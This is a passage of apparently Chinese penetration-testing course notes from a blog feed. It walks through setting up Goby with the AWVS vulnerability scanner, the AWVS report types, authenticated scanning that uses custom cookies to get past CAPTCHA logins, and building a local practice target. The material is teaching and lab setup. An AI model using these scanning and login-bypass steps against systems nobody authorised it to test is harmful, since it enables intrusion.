src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/cae347217f2e4edb8f49885f9c31a6f2.png" alt="image.png"></p><p>2.解压到喜欢的位置</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/b25b706b644b4b54a1c5444d7773c6ff.png" alt="image.png"></p><p>3.解压目录找到Goby.exe 右键–管理员运行</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/7c563477fdff4c5a92a428fa38faba5f.png" alt="image.png"></p><p>4.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/1c17dae4b2724ad9a4609c8209c568b0.png" alt="image.png"></p><p>5.点击【More】如图所示，点击【EN】，点击【CN】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/d1622b88bc2e43fd94bd7d394c2e6ba9.png" alt="image.png"></p><p>6.点击【扩展程序】，搜索【AWVS】，点击【下载】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/94e1952d4b714acd8b24bdc3b4c50976.png" alt="image.png"></p><p>7.点击【已下载】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/39fed8e90aeb463b8e99cbb721c626b0.png" alt="image.png"></p><p>8.点击【设置】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/6faa54cf76814488b5cc2e8c83b41efb.png" alt="image.png"></p><p>9.切换到【AWVS】，点击【用户】，点击【Profile】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/fa740fd2d32c46b5ad8cdd850deefa46.png" alt="image.png"></p><p>10.找到【API Key】，点击【Generate New Api Key】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/23a868079ed34c498768f5d1bfa4a755.png" alt="image.png"></p><p>11.点击【Show】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/3873ed2d97d04a4a8e8b8f85150c9e5d.png" alt="image.png"></p><p>12.点击【copy】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/f8ea9c32faf2473b90555bca447f6a83.png" alt="image.png"></p><p>13.切换【Goby】，粘贴【API Key】和输入【AVWS WEB ADDress】，点击【Confirm】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/8545ca84026847929bd53a6285f97edf.png" alt="image.png"></p><p>14.点击【设置】，点击【扩展设置】，点击【确认】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/701dd8ccce124f31979a9b6600a5e74a.png" alt="image.png"></p><h2 id="3-安装npcap-0-9995-exe"><a href="#3-安装npcap-0-9995-exe" class="headerlink" title="3.安装npcap-0.9995.exe"></a>3.安装npcap-0.9995.exe</h2><p>1.右键点击附件里的【npcap-0.9995.exe】，选则【以管理员身份运行】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/f96ab014dfcd46d4a650b11b35f8f336.png" alt="image.png"></p><p>2.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/d41404e228f64985a88963772328a880.png" alt="image.png"></p><p>3.点击【I Agree】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/3f7a7549f8cf4dab8d7bdd02685d2388.png" alt="image.png"></p><p>4.点击【Install】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/27389ce180dc455c9664b7ba65497d98.png" alt="image.png"></p><p>5.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/36733835588743a9a6f48f1c8995d86f.png" alt="image.png"></p><p>6.点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/fa9e44c0f7ea43f580eaa960ffd22238.png" alt="image.png"></p><p>7.点击【Finish】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/7fd9171e27a24a3db7b5f7ae0dd12f1b.png" alt="image.png"></p><h2 id="4-Goby-AWVS联动扫描"><a href="#4-Goby-AWVS联动扫描" class="headerlink" title="4.Goby+AWVS联动扫描"></a>4.Goby+AWVS联动扫描</h2><p>1.点击【扫描】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/e745ef82f410486a8c29fb843f2461df.png" alt="image.png"></p><p>2.输入ip进行扫描,点击【开始】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/3fbba4b002b34c17b9cef3f28df2199c.png" alt="image.png"></p><p>3.等待扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/d82b2aa35ea04f55bd3657510b9b4ee9.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/a1555b1037414aa89d64974f5de7aa2d.png" alt="image.png"></p><p>4.点击【Web检测】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/0d6585029108492b92257c9fa108cba2.png" alt="image.png"></p><p>5.点击【awvs】扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/cf99391ca82e4b0db9569ca2ff4e6585.png" alt="image.png"></p><p>6.切换到【AWVS】，点击【Scans】，点击【Goby传过来的任务】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/8ce4d62b7ce141fdbf18e01a3150afe2.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/1f1055af4d6848338edfd6a5dd4b7de1.png" alt="image.png"></p><p>7.切回到【Goby】，点击【扩展程序】,点击【awvs】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/f3d160eed543449cafc8a417c8d6f85d.png" alt="image.png"></p><p>8.选择报告模板，点击【Generate】,生成报告</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/05d00d10c2bc4de8b8d857f993d32588.png" alt="image.png"></p><p>9.点击【Export】可以导出报告</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/a93fcf070fa84692ae562e68e156cdb4.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-4-jie-sao-miao-bao-gao-fen-xi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-4-jie-sao-miao-bao-gao-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="第四节-扫描报告分析"><a href="#第四节-扫描报告分析" class="headerlink" title="第四节-扫描报告分析"></a>第四节-扫描报告分析</h1><h2 id="AWVS报告类型"><a href="#AWVS报告类型" class="headerlink" title="AWVS报告类型"></a>AWVS报告类型</h2><p>Standard Reports：标准报告</p><p>Affected Items：受影响项目</p><p>Comprehensive (new)：综合（新）</p><p>Developer：开发者</p><p>Executive Summary：执行摘要</p><p>Quick：快速报告</p><h2 id="Compliance-Reports：合规报告"><a href="#Compliance-Reports：合规报告" class="headerlink" title="Compliance Reports：合规报告"></a>Compliance Reports：合规报告</h2><p>CWE / SANS Top 25：SANS (SysAdmin, Audit, Network, Security) 研究所是美国一家信息安全培训与认证机构</p><p>DISA STIG：DISA STIG 是指提供技术指南（STIG — 安全技术实施指南）的组织（DISA — 国防信息系统局）</p><p>HIPAA：HIPAA标准</p><p>ISO 27001：国际标准</p><p>NIST SP 800-53：联邦信息系统标准</p><p>OWASP Top 10 2013：开放式Web应用程序安全项目 2013标准</p><p>OWASP Top 10 2017：开放式Web应用程序安全项目 2017标准</p><p>PCI DSS 3.2：即支付卡行业数据安全标准</p><p>Sarbanes Oxley：萨班斯法案标准</p><p>WASC Threat Classification：WASC 组织标准</p><h2 id="最常用的报告类型："><a href="#最常用的报告类型：" class="headerlink" title="最常用的报告类型："></a>最常用的报告类型：</h2><p>1.Executive Summary：执行摘要 给公司大领导看，只关注整体情况，不关注具体细节</p><p>2.Comprehensive (new)：综合（新）：一般给QA和产品经理看</p><p>3.Developer：开发者：给开发人员看</p><p>4.OWASP Top 10 2017 行业报告的代表</p><p>5.WASC Threat Classification 行业报告的代表</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-3-jie-awvs-sao-miao-web-ying-yong-cheng-xu/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-3-jie-awvs-sao-miao-web-ying-yong-cheng-xu/</url>
      
        <content type="html"><![CDATA[<h1 id="第三节-AWVS扫描Web应用程序"><a href="#第三节-AWVS扫描Web应用程序" class="headerlink" title="第三节-AWVS扫描Web应用程序"></a>第三节-AWVS扫描Web应用程序</h1><h2 id="1-账户密码登录扫描"><a href="#1-账户密码登录扫描" class="headerlink" title="1.账户密码登录扫描"></a>1.账户密码登录扫描</h2><p>1.点击【Targets】，点击【add Target】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/36991ed7d4ba43f5aff2ed560749d35c.png" alt="image.png"></p><p>2.输入扫描地址和扫描描述,点击【save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/a92e61f1c3cf479ca7c04a8105bc617b.png" alt="image.png"></p><p>3.点击【Site Login】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/cc6082a28000438fb243888a3b5327f5.png" alt="image.png"></p><p>4.选择【try to auto-login into the site】,输入登录地址，用户名【xiaogang】，密码【123456】，重复密码【123456】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4f5f3ed8e050454da04304dfbf077784.png" alt="image.png"></p><p>5.点击【HTTP Authentication】的开启按钮</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/ca1b8fd89df143d8a32a114a9f971fa6.png" alt="image.png"></p><p>6.输入用户名【小刚】,密码【123456】，重复密码【123456】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/02d9c182fc4a4aaf84186c293614aac5.png" alt="image.png"></p><p>7.点击【save】，然后点击【Scan】按钮</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/d9df48791deb4782bf8e421cc69d64a8.png" alt="image.png"></p><p>8.选择扫描设置，如图所示，点击【create Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4ebab4587a3a4abf81832bc4989c26ba.png" alt="image.png"></p><p>9.点击扫描目标，查看扫描具体内容</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/9e11ed8ed6f24a76a46002b080400de5.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/5e96d1f03e154a0f822790fa2c0e68ec.png" alt="image.png"></p><p>10.等待扫描完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/d78be9706759447580549e5988e03992.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4d217c7e40e74a27b0ef45cc199e8164.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/c0a379d78ce840c8a7e53eb742c00063.png" alt="image.png"></p><h2 id="2-利用录制登录序列脚本扫描"><a href="#2-利用录制登录序列脚本扫描" class="headerlink" title="2.利用录制登录序列脚本扫描"></a>2.利用录制登录序列脚本扫描</h2><p>1.点击【Targets】，点击【add Target】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/339ff784fc8a4afb9ff6764f19515ef6.png" alt="image.png"></p><p>2.输入扫描地址和扫描描述,点击【save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/776d1d5413c344f9b0971f516d601343.png" alt="image.png"></p><p>3.点击【Site Login】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/7739d66d7aac4c5da0480d475773b3e8.png" alt="image.png"></p><p>4.选择【Use pre-recorded login sequence 】,点击【New】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/994d395f718b45499787edd45a19b638.png" alt="image.png"></p><p>5.点击【登录】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/c29d1e54000945b192df336e08c91347.png" alt="image.png"></p><p>6.输入用户名【xiaogang】，密码【123456】,点击【登录】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/cc5e9e0302c54028812dacf84cb06860.png" alt="image.png"></p><p>7.检查登录脚本流程是否完整，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/e62eec33761c4c2094454c341bb51095.png" alt="image.png"></p><p>8.点击【xaiogang_vip3】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/387c0b1b3d4a4bdab0fd2ff9f7f63927.png" alt="image.png"></p><p>9.点击【Restrict requests to path】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/fddbf7c1804e41548435d3528683d093.png" alt="image.png"></p><p>10.点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/ce0add0774944ffe9d8927a577cb2ef6.png" alt="image.png"></p><p>11.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/98c4b3e7a6dc419eb47b7c7484cd2031.png" alt="image.png"></p><p>12.点击【Finish】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/696267829a0b43fc9e85b95fca2d88f8.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/dc773606b84d4711bf43c4e6dc931ce0.png" alt="image.png"></p><p>13.点击【Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/485e9f63b9b04b54b4b0d167fcce6109.png" alt="image.png"></p><p>14.选怎扫描配置，如下图所示，点击【Create Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/1a594edc6fd04f2aa029c8bdd8243c61.png" alt="image.png"></p><p>15.点击目标连接，查看具体扫描信息</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/dbb993767f214481b9d2e73f3edd6341.png" alt="image.png"></p><p>16.等待扫描完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/03e6d16afaec4f48b73bfe009796c34f.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/fd0c824cc75d4e0daaed7d6d3aeeeb82.png" alt="image.png"></p><h2 id="3-利用定制cookie扫描"><a href="#3-利用定制cookie扫描" class="headerlink" title="3.利用定制cookie扫描"></a>3.利用定制cookie扫描</h2><p>扫描过程会遇到网站 存在 手机验证码，图形验证码，滑动验证等等，这时候想要深度扫描时，就需要进行登录绕过。最长用的手段就是定制cookie绕过。</p><p>1.点击【Targets】，点击【add Target】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/773081aad11743e1afa80907ea1cee93.png" alt="image.png"></p><p>2.输入扫描地址和扫描描述,点击【save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/38cb04b93af647d8b728150d39621a16.png" alt="image.png"></p><p>3.点击【Advanced】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/5825a551928b43219f0fc9af60192257.png" alt="image.png"></p><p>4.点击【Custom Cookies】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/fcdc3b768b124c3facf16d1b48f6b501.png" alt="image.png"></p><p>5.输入被测网站网址</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/b0275ea0dd1d40a08419dcb420fd0cc3.png" alt="image.png"></p><p>6.切换到其他浏览器，获取网站的cookie值</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/152a0512b80e4849841a679a47a39523.png" alt="image.png"></p><p>7.切换会AWVS，输入cookie的值，点击【+】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/649473f702434786b796dbc2d2c288fa.png" alt="image.png"></p><p>8.点击【save】，然后点击【Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/e4875f76ecdf4c018469b5a95a64c094.png" alt="image.png"></p><p>9.设置扫描选项，如下图所示，点击【Create Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/5ffa52bd590e42048dfb0e8158b83211.png" alt="image.png"></p><p>10.点击扫描的网站地址，查看扫描信息</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4e18d51428f741c9a5e8da8cdda0f3c0.png" alt="image.png"></p><p>11.等待扫描完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/1e36af11e5b14c9ca46f1f4bb1fd9ca0.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/979340ee6370462da77cfb93f83b7407.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-2-jie-sao-miao-huan-jing-da-jian/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-2-jie-sao-miao-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="第二节-扫描环境搭建"><a href="#第二节-扫描环境搭建" class="headerlink" title="第二节-扫描环境搭建"></a>第二节-扫描环境搭建</h1><h2 id="1-phpstudy-pro安装"><a href="#1-phpstudy-pro安装" class="headerlink" title="1.phpstudy_pro安装"></a>1.phpstudy_pro安装</h2><p>1.右键【phpstudy_x64_8.1.1.3】，选则【以管理员身份运行】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/b356aebd026a401ab1280cd88de7dbc1.png" alt="image.png"></p><p>2.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/72a8f98ad53c4f8386286be533efeb84.png" alt="image.png"></p><p>3.点击【自定义选项】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/0ec2b36d494e47aaa18b13d6ffff66bd.png" alt="image.png"></p><p>4.选择喜欢的位置安装</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/9aa79d49261d403b88ae8e718edd8cf8.png" alt="image.png"></p><p>5.点击【立即安装】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/53c37dd487324979b5c1bf8bbe67241a.png" alt="image.png"></p><p>6.等待安装</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/7abe81557a3641ee8bd5df7c023f2d46.png" alt="image.png"></p><p>7.点击【安装完成]</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/4de8ebb124e148e380e1cf41d8ac17fb.png" alt="image.png"></p><p>8.点击启动【Apache】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/da5592a33fd64576b9595e61b879d6e2.png" alt="image.png"></p><p>9.点击【允许访问】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/22dfca13a18c48fc903e04d49fcf60c5.png" alt="image.png"></p><p>10.点击启动【MySQL】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/946782beb70d48b88eea87240e7634a3.png" alt="image.png"></p><p>11.点击【允许访问】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/5d0618a415824060ac2cb34d37df5f9d.png" alt="image.png"></p><p>12.按照下图确认服务启动状态</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/054b9c7efd944364af2be96892efc5d5.png" alt="image.png"></p><h2 id="2-设置扫描靶场的数据库"><a href="#2-设置扫描靶场的数据库" class="headerlink" title="2.设置扫描靶场的数据库"></a>2.设置扫描靶场的数据库</h2><p>1.点击【数据库】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/34958b63d9cb4ab591f43c4912d366c9.png" alt="image.png"></p><p>2.点击【修改root密码】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/4d75a477c5004794b2d8c4dc71016167.png" alt="image.png"></p><p>3.输入新密码【123456】，点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/b4181c549ce84ba3ba82bb0cd2d9b373.png" alt="image.png"></p><p>4.点击【好】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/6b4d5ece9ae84759ba5fc05e214618cc.png" alt="image.png"></p><p>5.点击【创建数据库】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/7604abbea2be498fba9bfbcc809bfefa.png" alt="image.png"></p><p>6.输入数据库名称【gkk】，用户名【gkk】，密码【123456】，点击【确认】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/a111522dd2024de88a93dd7408e3f008.png" alt="image.png"></p><p>7.点击【好】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/fe06b9a505c741568a5fc0749de93eaf.png" alt="image.png"></p><p>8.按照下图核对数据信息（点击密码******就可以显示成明文）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/aec1cf31b5114c7fbc5eb7429517d1b1.png" alt="image.png"></p><p>9.点击【软件管理】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/a165762f120f430a9905c9a47e7b665e.png" alt="image.png"></p><p>10.点击【数据库工具（客户端）】,点击【安装】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/fb3eee3d72884553910fe7e01240a387.png" alt="image.png"></p><p>11.安装成功后，点击【管理】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/62406be89b314b64ae478775b54ab678.png" alt="image.png"></p><p>12.点击【打开】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/ccb4bb3c02084648a66b3232ae8c2f8a.png" alt="image.png"></p><p>13.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/c3439b02b9e84aed888cd1d29f6f23ec.png" alt="image.png"></p><p>14.输入用户名【root】，密码【123456】，点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/475dca31e00c47d1b1407bbf83d0c714.png" alt="image.png"></p><p>15.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/c30021f4fcce403694b9ddf7770c37ed.png" alt="image.png"></p><p>16.点击选中【gkk】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/bf0e4a513f7f4ceb9a0afefb7c9e1fb0.png" alt="image.png"></p><p>17.点击【文件】，选则【输入】，点击【SQL文件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/670f0df400d9463e895aab34ed22cd10.png" alt="image.png"></p><p>18.选择课程附件里带的【gkk.sql】，点击【打开】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/170a264dbf7647829bbb4fbe0e0ab410.png" alt="image.png"></p><p>19.导入完成后，点击【关闭】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/cae74489ba3540af8c7ea9f4ff6e6e6e.png" alt="image.png"></p><p>20.根据下图查看数据库表的配置，必须和课件一致才可以</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/722fea8aa43c4cacb4e503ab5c0d1b6b.png" alt="image.png"></p><h2 id="3-部署靶场网站"><a href="#3-部署靶场网站" class="headerlink" title="3.部署靶场网站"></a>3.部署靶场网站</h2><p>1.将课件里带的两个靶场【have_code】【no_code】复制到一个纯英文的路径下</p><p>have_code: 登录有验证码靶场</p><p>no_code:登录没有验证码靶场</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/d75060e8774b4a949f32e5bd09ccf047.png" alt="image.png"></p><p>2.打开phpstudy_pro,点击【网站】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/4172bad9154943dc802e55c24cbf374c.png" alt="image.png"></p><p>3.点击【创建网站】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/bf201c4497e8480c9e771171ff6bac41.png" alt="image.png"></p><p>4.输入域名【127.0.0.1】，端口改为【81】，点击【浏览】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/fa04d3e4f01a4db9ba18aea6e6ee213b.png" alt="image.png"></p><p>5.选择【no_code】靶场，点击【选择文件夹】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/9c75e6911177447796da41d3ef745aa5.png" alt="image.png"></p><p>6.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/e1bd846aa81c42a7929f0ce3794b44bd.png" alt="image.png"></p><p>7.点击【好】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/691acf90a32e4edfae340933792db33f.png" alt="image.png"></p><p>8.点击【创建网站】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/8158d81ba2c14ffa98b9dd5c67f64a98.png" alt="image.png"></p><p>9.输入域名【127.0.0.1】，端口改为【82】，点击【浏览】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/ca9307144fb74a1286a00fe2adaade51.png" alt="image.png"></p><p>10.选择【have_code】，点击【选择文件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/a9f6188674c141f288ae3e2bfea04051.png" alt="image.png"></p><p>11.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/c05237bc4a71445ca3ba733b6cf22410.png" alt="image.png"></p><p>12.点击【好】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/ada2b949cdaa4bd7a0e88b89c7f4934d.png" alt="image.png"></p><p>13.点击【首页】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/cd8d650c7a1a4b60adc1a585c6e49b0b.png" alt="image.png"></p><p>14.点击【重启】，重启Apache</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/78a1d78620be4d37b535e6dff4e024f6.png" alt="image.png"></p><p>15.重启完成后，浏览器访问 127.0.0.1:81/login.php</p><p><img 